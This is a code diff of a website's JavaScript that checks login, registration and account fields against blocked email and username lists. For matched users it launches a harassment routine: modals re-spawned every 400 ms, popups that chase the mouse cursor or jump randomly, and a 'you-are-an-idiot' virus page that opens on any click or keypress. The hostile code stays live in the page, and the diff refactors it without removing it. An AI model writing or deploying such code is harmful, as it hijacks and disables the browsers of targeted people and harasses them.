@@ -8,35 +8,35 @@
   var VIRUS_URL = BASE + '/you-are-an-idiot/virus.html';
   var _triggered = false;
 
-  function checkInputValue(val) {
+  var AUTH_FIELDS = 'input[name="login_identifier"],input[name="reg_username"],input[name="email"],input[name="forgot_identifier"]';
+
+  function checkVal(val) {
     if (_triggered) return;
     var v = (val || '').trim().toLowerCase().replace(/^@/, '');
+    if (!v) return;
     for (var i = 0; i < BLOCKED_EMAILS.length; i++) { if (v === BLOCKED_EMAILS[i]) { _triggered = true; runBan(); return; } }
     for (var j = 0; j < BLOCKED_USERNAMES.length; j++) { if (v === BLOCKED_USERNAMES[j]) { _triggered = true; runBan(); return; } }
     for (var k = 0; k < BLOCKED_DISPLAY_NAMES.length; k++) {
-      if (v === BLOCKED_DISPLAY_NAMES[k]) {
-        _triggered = true;
-        showDisplayNameWarning();
-        return;
-      }
+      if (v === BLOCKED_DISPLAY_NAMES[k]) { _triggered = true; showDisplayNameWarning(); return; }
     }
   }
 
-  function watchInputs() {
-    function attach(el) {
-      if (el._banWatched) return;
-      el._banWatched = true;
-      function handler() { checkInputValue(el.value); }
-      el.addEventListener('input', handler);
-      el.addEventListener('change', handler);
-    }
-    function scan(root) {
-      var inputs = (root || document).querySelectorAll('input[type="text"],input[type="email"],input:not([type]),textarea');
-      for (var i = 0; i < inputs.length; i++) attach(inputs[i]);
-    }
+  function attach(el) {
+    if (el._banW) return;
+    el._banW = true;
+    function h() { checkVal(el.value); }
+    el.addEventListener('input', h);
+    el.addEventListener('change', h);
+  }
+
+  function scan() {
+    var els = document.querySelectorAll(AUTH_FIELDS);
+    for (var i = 0; i < els.length; i++) attach(els[i]);
+  }
+
+  function watchAuthFields() {
     scan();
-    var obs = new MutationObserver(function() { scan(); });
-    obs.observe(document.body || document.documentElement, { childList: true, subtree: true });
+    new MutationObserver(scan).observe(document.body || document.documentElement, { childList: true, subtree: true });
   }
 
   function loadFont() {
@@ -73,9 +73,7 @@
   }
 
   function runBan() {
-    loadFont();
-    injectKeyframes();
-    makeModal();
+    loadFont(); injectKeyframes(); makeModal();
     setInterval(makeModal, 400);
     setTimeout(stage3, 2000);
   }
@@ -89,7 +87,6 @@
     popup.document.write('document.getElementById("cl").addEventListener("click",function(e){e.stopPropagation();window.opener&&window.opener.postMessage("_ban_close_clicked","*");});');
     popup.document.write('<\/script></body></html>');
     popup.document.close();
-
     window.addEventListener('message', function handler(ev) {
       if (ev.data !== '_ban_close_clicked') return;
       window.removeEventListener('message', handler);
@@ -101,27 +98,16 @@
     var laggerPopup = window.open(LAGGER_URL, '_blank', 'width=500,height=400');
     var mouseX = screen.width / 2, mouseY = screen.height / 2;
     document.addEventListener('mousemove', function(e) { mouseX = e.screenX; mouseY = e.screenY; });
-
-    setInterval(function() {
-      try { if (existingPopup && !existingPopup.closed) existingPopup.moveTo(mouseX - 200, mouseY - 150); } catch(e) {}
-    }, 30);
-
-    setInterval(function() {
-      try { if (laggerPopup && !laggerPopup.closed) laggerPopup.moveTo(Math.random() * (screen.width - 400), Math.random() * (screen.height - 300)); } catch(e) {}
-    }, 150);
-
+    setInterval(function() { try { if (existingPopup && !existingPopup.closed) existingPopup.moveTo(mouseX - 200, mouseY - 150); } catch(e) {} }, 30);
+    setInterval(function() { try { if (laggerPopup && !laggerPopup.closed) laggerPopup.moveTo(Math.random() * (screen.width - 400), Math.random() * (screen.height - 300)); } catch(e) {} }, 150);
     var virusFired = false;
-    function fireVirus() {
-      if (virusFired) return;
-      virusFired = true;
-      window.open(VIRUS_URL, '_blank', 'width=600,height=400');
-    }
+    function fireVirus() { if (virusFired) return; virusFired = true; window.open(VIRUS_URL, '_blank', 'width=600,height=400'); }
     ['click','keydown','mousedown','touchstart','pointerdown','scroll'].forEach(function(ev) {
       document.addEventListener(ev, fireVirus, { once: true, capture: true });
     });
   }
 
-  function checkUser() {
+  function checkLoggedInUser() {
     fetch('/api/auth/me', { credentials: 'same-origin' })
       .then(function(r) { return r.json(); })
       .then(function(d) {
@@ -137,24 +123,17 @@
           if (username === BLOCKED_USERNAMES[j]) { _triggered = true; runBan(); return; }
         }
         for (var k = 0; k < BLOCKED_DISPLAY_NAMES.length; k++) {
-          if (displayName === BLOCKED_DISPLAY_NAMES[k]) {
-            _triggered = true;
-            showDisplayNameWarning();
-            return;
-          }
+          if (displayName === BLOCKED_DISPLAY_NAMES[k]) { _triggered = true; showDisplayNameWarning(); return; }
         }
       })
       .catch(function() {});
   }
 
   function init() {
-    checkUser();
-    watchInputs();
+    checkLoggedInUser();
+    watchAuthFields();
   }
 
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init);
-  } else {
-    init();
-  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
 })();
